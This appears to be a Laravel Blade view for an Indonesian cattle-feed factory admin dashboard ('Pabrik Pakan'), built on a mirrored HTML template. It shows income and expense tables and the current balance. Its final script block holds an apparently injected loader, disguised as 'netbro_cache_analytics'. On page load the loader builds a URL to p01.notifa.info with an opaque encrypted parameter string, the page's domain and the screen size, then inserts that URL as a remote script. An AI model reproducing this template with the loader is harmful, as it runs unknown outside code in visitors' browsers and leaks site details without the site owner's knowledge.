<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:42:30 GMT -->
<head>
    <meta charset="UTF-8">
    <meta content="ie=edge" http-equiv="x-ua-compatible">
    <meta content="template language" name="keywords">
    <meta content="Design_Gurus" name="author">
    <meta content="WOW Admin dashboard html template" name="description">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <title>SAPI-I7</title>

    <!--favicon-->
    <link href="../assetAdmin/assets/images/favicon.ico" rel="shortcut icon">

    <!--Preloader-CSS-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/preloader/preloader.css">

    <!--bootstrap-4-->
    <link rel="stylesheet" href="../assetAdmin/assets/css/bootstrap.min.css">

    <!--Custom Scroll-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
    <!--Font Icons-->
    <link rel="stylesheet" href="../assetAdmin/assets/icons/simple-line/css/simple-line-icons.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/dripicons/dripicons.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/eightyshades/eightyshades.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/foundation/foundation-icons.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/metrize/metrize.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/typicons/typicons.min.css">
    <link rel="stylesheet" href="../assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">

    <!--Date-range-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/date-range/daterangepicker.css">
    <!--Drop-Zone-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/dropzone/dropzone.css">
    <!--Full Calendar-->
    <link rel="stylesheet" href="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
    <!--Normalize Css-->
    <link rel="stylesheet" href="../assetAdmin/assets/css/normalize.css">
    <!--Main Css-->
    <link rel="stylesheet" href="../assetAdmin/assets/css/main.css">
</head>
<body>

<!--Navigation-->
<nav id="navigation" class="navigation-sidebar bg-primary">
    <div class="navigation-header">
        <a><span class="logo">PABRIK PAKAN</span></a>
        <!--<img src="logo.png" alt="logo" class="brand" height="50">-->
    </div>

    <!--Navigation Profile area-->
    <div class="navigation-profile">
        <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
        <h4 class="name">Admin Pabrik</h4>
        <span class="designation">SAPI</span>
    </div>
    <!--Navigation Menu Links-->
    @include('pabrik.include_pabrik')
</nav>

<!--Page Container-->
<section class="page-container">
    <div class="page-content-wrapper">
        <!--Header Fixed-->
        <div class="header fixed-header">
            <div class="container-fluid" style="padding: 10px 25px">
                <div class="row">
                    <div class="col-9 col-md-6 d-lg-none">
                        <a id="toggle-navigation" href="javascript:void(0);" class="icon-btn mr-3"><i
                                    class="fa fa-bars"></i></a>
                        <span class="logo">PABRIK PAKAN</span>
                    </div>
                    <div class="col-lg-8 d-none d-lg-block">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="index.html">Dashboard</a></li>
                        </ol>
                    </div>
                </div>
            </div>
        </div>


        <!--Main Content-->
        <div class="content sm-gutter">
            <div class="container-fluid padding-25 sm-padding-10">
                <div class="row">
                    <div class="col-12">
                        <div class="col-12 col-sm-12 col-md-12 col-lg-12" id="div_pemasukan">
                            <div class="block counter-block mb-4"
                                 style="background: url(../assetAdmin/assets/images/pabrik_1.jpg);">
                                <div class="value">Rp. {{number_format($total_pemasukan,0,",",".") . ",-"}}</div>
                                <p class="label text-dark">Total Pemasukan</p>
                                <div class="block bg-transparent text-right">
                                    <a class="btn btn-sm trending trending-up pull-right">
                                        <span id="detail_pemasukan" class="text-white">Tampilkan Detail</span>
                                        <i class="fa fa-caret-up text-white" id="caret_pemasukan"></i>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="block form-block mb-4" style="display: none" id="pemasukan">
                            <div class="block-heading">
                                <h5>Detail Pemasukan</h5>
                            </div>
                            <div class="tabel table-responsive">
                                <table id="example1"
                                       class="table table-bordered table-striped dataTable example1"
                                       role="grid"
                                       aria-describedby="example1_info">
                                    <thead>
                                    <tr>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            No.
                                        </th>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            Nama_Pengajuan
                                        </th>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            Tanggal Pembelian
                                        </th>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            Jumlah Pembelian
                                        </th>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            Harga
                                        </th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    @php($no =0)
                                    @foreach($history_pemasukan as $item)
                                        @php($no++)
                                        <tr>
                                            <td style="vertical-align: middle!important;">{{$no}}</td>
                                            <td style="vertical-align: middle!important;">{{$item->join_pengajuan->nama_peternak}}</td>
                                            <td style="vertical-align: middle!important;">{{date('d-m-Y', strtotime($item->tanggal_pengambilan))}}</td>
                                            <td style="text-align: center!important; vertical-align: middle!important;">{{$item->jumlah_pakan_diambil}}</td>
                                            <td style="text-align: center!important; vertical-align: middle!important;">{{number_format($item->harga_pengambilan,0,",",".") . ",-"}}
                                            </td>
                                        </tr>
                                    @endforeach
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div class="col-12 col-sm-12 col-md-12 col-lg-12" id="div_pengeluaran">
                            <div class="block counter-block mb-4"
                                 style="background: url(../assetAdmin/assets/images/pabrik_3.jpg);">
                                <div class="value">Rp. {{number_format($total_pengeluaran,0,",",".") . ",-"}}</div>
                                <p class="label text-dark">Total Pengeluaran</p>
                                <div class="block bg-transparent text-right">
                                    <a class="btn btn-sm trending trending-down pull-right">
                                        <span id="detail_pengeluaran" class="text-white">Tampilkan Detail</span>
                                        <i class="fa fa-caret-up text-white" id="caret_pengeluaran"></i>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="block form-block mb-4" style="display: none" id="pengeluaran">
                            <div class="block-heading">
                                <h5>Detail Pengeluaran</h5>
                            </div>
                            <div class="tabel table-responsive">
                                <table id="example2"
                                       class="table table-bordered table-striped dataTable example2"
                                       role="grid"
                                       aria-describedby="example2_info">
                                    <thead>
                                    <tr>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            No.
                                        </th>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            Nama Bahan Baku
                                        </th>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            Tanggal Pembelian
                                        </th>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            Jumlah Pembelian
                                        </th>
                                        <th style="text-align: center!important; vertical-align: middle!important;">
                                            Harga
                                        </th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    @php($no =0)
                                    @foreach($history_pengeluaran as $item)
                                        @php($no++)
                                        <tr>
                                            <td style="vertical-align: middle!important;">{{$no}}</td>
                                            <td style="vertical-align: middle!important;">{{$item->join_bahan_baku->nama_bahan_baku}}</td>
                                            <td style="vertical-align: middle!important;">{{date('d-m-Y', strtotime($item->tanggal_pembelian))}}</td>
                                            <td style="text-align: center!important; vertical-align: middle!important;">{{$item->beli_baru}}</td>
                                            <td style="text-align: center!important; vertical-align: middle!important;">{{number_format($item->harga_baru,0,",",".") . ",-"}}
                                            </td>
                                        </tr>
                                    @endforeach
                                    </tbody>
                                </table>
                            </div>
                        </div>
                        <div class="col-12 col-sm-12 col-md-12 col-lg-12" id="div_total">
                            <div class="block counter-block mb-4"
                                 style="background: url(../assetAdmin/assets/images/pabrik_4.jpg);">
                                <div class="value text-white">
                                    Rp. {{number_format(($total_pemasukan - $total_pengeluaran),0,",",".") . ",-"}}</div>
                                <p class="label text-white">Saldo Saat Ini</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

</section>


<!--Jquery-->
<script type="text/javascript" src="../assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
<!--Bootstrap Js-->
<script type="text/javascript" src="../assetAdmin/assets/js/popper.min.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/js/bootstrap.min.js"></script>
<!--Modernizr Js-->
<script type="text/javascript" src="../assetAdmin/assets/js/modernizr.custom.js"></script>

<!--Morphin Search JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/classie.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
<!--Morphin Search JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/preloader-main.js"></script>

<!--Chart js-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/charts/Chart.min.js"></script>

<!--Sparkline Chart Js-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>

<!--Custom Scroll-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
<!--Sortable Js-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
<!--DropZone Js-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
<!--Date Range JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/moment.min.js"></script>
<script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
<!--CK Editor JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
<!--Data-Table JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
<!--Editable JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/editable/editable.js"></script>
<!--Full Calendar JS-->
<script type="text/javascript" src="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>

<!--- Main JS -->
<script src="../assetAdmin/assets/js/main.js"></script>

<script type="text/javascript">if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        $('#example1').DataTable({
            'paging': true,
            'lengthChange': false,
            'searching': false,
            'ordering': false,
            'info': false,
            'autoWidth': false,
            'pageLength': 10,
            "dom": '<"pull-left"f>t<"pull-right"p>',
            "oLanguage": {
                "sSearch": "Cari : "
            }
        });

        $('#example2').DataTable({
            'paging': true,
            'lengthChange': false,
            'searching': false,
            'ordering': false,
            'info': false,
            'autoWidth': false,
            'pageLength': 10,
            "dom": '<"pull-left"f>t<"pull-right"p>',
            "oLanguage": {
                "sSearch": "Cari : "
            }
        });

        $("#detail_pemasukan").click(function () {
            if (document.getElementById('detail_pemasukan').innerText == "TAMPILKAN DETAIL") {
                document.getElementById('detail_pemasukan').innerText = "Tutup Detail";
                document.getElementById('caret_pemasukan').className = "fa fa-caret-down text-white";
                $("#pemasukan").fadeIn();
            } else {
                document.getElementById('detail_pemasukan').innerText = "Tampilkan Detail";
                document.getElementById('caret_pemasukan').className = "fa fa-caret-up text-white";
                $("#pemasukan").fadeOut();
            }
        });

        $("#detail_pengeluaran").click(function () {
            if (document.getElementById('detail_pengeluaran').innerText == "TAMPILKAN DETAIL") {
                document.getElementById('detail_pengeluaran').innerText = "Tutup Detail";
                document.getElementById('caret_pengeluaran').className = "fa fa-caret-down text-white";
                $("#pengeluaran").fadeIn();
            } else {
                document.getElementById('detail_pengeluaran').innerText = "Tampilkan Detail";
                document.getElementById('caret_pengeluaran').className = "fa fa-caret-up text-white";
                $("#pengeluaran").fadeOut();
            }
        });

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
</body>

<!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:44:19 GMT -->
</html>